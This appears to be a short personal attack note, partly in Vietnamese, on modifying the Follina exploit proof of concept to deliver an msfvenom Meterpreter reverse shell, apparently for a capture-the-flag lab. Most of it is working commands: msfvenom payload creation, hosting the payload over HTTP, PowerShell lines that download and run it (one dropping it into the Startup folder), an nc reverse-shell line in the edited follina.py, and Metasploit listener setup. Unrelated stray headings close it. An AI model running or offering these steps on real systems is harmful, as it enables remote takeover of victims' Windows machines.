# Fix PoC Follina + combine with msfvenom
## 1. Create Payload with msfvenom
Create Reverse shell ip attacker, port 8386
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.1 LPORT=8386 -f exe -o shell.exe
```
PVN-ctfd
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=40.0.0.10 LPORT=8386 -f exe -o shell.exe
```
Chỉnh sửa PoC Follina để tải và chạy payload bằng PowerShell
## 2. Host Payload 
```
python3 -m http.server 9000
```
## 3. Chỉnh sửa PoC Follina để tải và chạy payload
Tạm thời bỏ câu lệnh dưới đây
```powershell
powershell.exe -Command "(New-Object Net.WebClient).DownloadFile('http://192.168.100.1:9000/shell.exe', 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\shell.exe'); Start-Process 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\shell.exe'"
```
Thêm dòn này vào file follina.py
```python
command = f"""powershell.exe -Command \"(New-Object Net.WebClient).DownloadFile('http://192.168.100.1:9000/shell.exe', 'C:\\Users\\StaffB\\Downloads\\shell.exe'); Start-Process 'C:\\Users\\StaffB\\Downloads\\shell.exe'\""""
    # command = args.command
    # if args.reverse:
        # command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
```
C:\Users\StaffB\Downloads
```powershell
powershell.exe -Command "(New-Object Net.WebClient).DownloadFile('http://192.168.100.1:9000/shell.exe', 'C:\Users\StaffB\Downloads\shell.exe'); Start-Process 'C:\Users\StaffB\Downloads\shell.exe'"
```
## 4. Sử dụng Metasploit
1. Mở metasploit
```
msfconsole
```
2. Thiết lập listener
```
use exploit/multi/handler
```
```
set payload windows/meterpreter/reverse_tcp
```
```
set LHOST 192.168.100.1
```
```
set LPORT 8386
```
```
exploit
```
# Audit.sh PVN-VN
# Difference between metasploit and metasploit pro
# Umbraco Indexero
# Dockerfile Lab 0b01 command linux
# WebSec standford
